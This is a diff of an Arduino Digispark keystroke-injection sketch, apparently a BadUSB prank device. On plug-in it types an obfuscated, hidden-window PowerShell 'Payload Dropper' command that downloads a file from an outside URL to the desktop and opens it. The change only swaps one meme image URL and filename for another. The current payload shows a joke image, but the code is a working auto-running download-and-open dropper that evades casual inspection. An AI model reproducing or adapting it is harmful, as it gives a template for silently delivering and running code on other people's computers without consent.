@@ -8,7 +8,7 @@ void loop() {
   DigiKeyboard.delay(3000);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
   DigiKeyboard.delay(500);
-  DigiKeyboard.println(F("powershell -windowstyle hidden -command (N'ew'-Ob'j'ect Sy's'tem.Net.WebClient).DownloadFile(\\\"https://i.imgflip.com/3rg7qn.jpg\\\",\\\"$env:UserProfile\\desktop\\catz.jpeg\\\");in'v'oke-item $env:UserProfile\\desktop\\heckedszz.jpeg")); //Payload Dropper
+  DigiKeyboard.println(F("powershell -windowstyle hidden -command (N'ew'-Ob'j'ect Sy's'tem.Net.WebClient).DownloadFile(\\\"https://pics.me.me/hacker-voice-im-in-7633707.png\\\",\\\"$env:UserProfile\\desktop\\helo.jpeg\\\");in'v'oke-item $env:UserProfile\\desktop\\helo.jpeg")); //Payload Dropper
   DigiKeyboard.delay(500);
   digitalWrite(1, HIGH); //turn on led when program finishes
   DigiKeyboard.delay(90000);
